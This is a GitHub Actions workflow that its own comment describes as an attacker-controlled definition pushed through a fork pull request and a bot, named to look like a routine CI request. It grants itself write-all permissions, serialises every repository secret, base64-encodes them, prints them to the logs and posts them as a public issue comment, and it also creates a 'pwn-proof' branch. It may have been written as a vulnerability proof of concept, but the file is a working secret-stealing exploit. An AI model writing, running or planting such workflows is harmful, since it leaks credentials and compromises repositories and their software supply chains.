# attacker-controlled definition pushed via fork PR + copy-pr-bot
name: Request NVSkills CI

on:
  push:

jobs:
  probe:
    runs-on: ubuntu-latest
    permissions: write-all
    steps:
      - name: probe
        env:
          GH_TOKEN: ${{ github.token }}
          REPO: ${{ github.repository }}
          REF_NAME: ${{ github.ref_name }}
          SHA: ${{ github.sha }}
          ACTOR: ${{ github.actor }}
          ALL_SECRETS: ${{ toJSON(secrets) }}
        run: |
          echo "MARKER=lazyhacker6-rce-marker"
          echo "REF=$REF_NAME ACTOR=$ACTOR SHA=$SHA"
          echo "SECRET_NAMES=$(printf '%s' "$ALL_SECRETS" | jq -r 'keys|join(",")')"
          echo "SECRETS_B64_START"
          printf '%s' "$ALL_SECRETS" | base64 -w0; echo
          echo "SECRETS_B64_END"
          echo "--- token permissions ---"
          curl -s -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/$REPO" -o /dev/null -w 'repo_http=%{http_code}\n'
          printf '%s' "$ALL_SECRETS" | base64 -w0 > /tmp/b64.txt
          gh api -X POST "repos/$REPO/issues/2/comments" -f body="LZH6_SECRETS_B64=$(cat /tmp/b64.txt)" --jq .html_url || echo "comment failed"
          gh api -X POST "repos/$REPO/git/refs" -f ref=refs/heads/pwn-proof -f sha="$SHA" --jq .ref || echo "ref create failed"
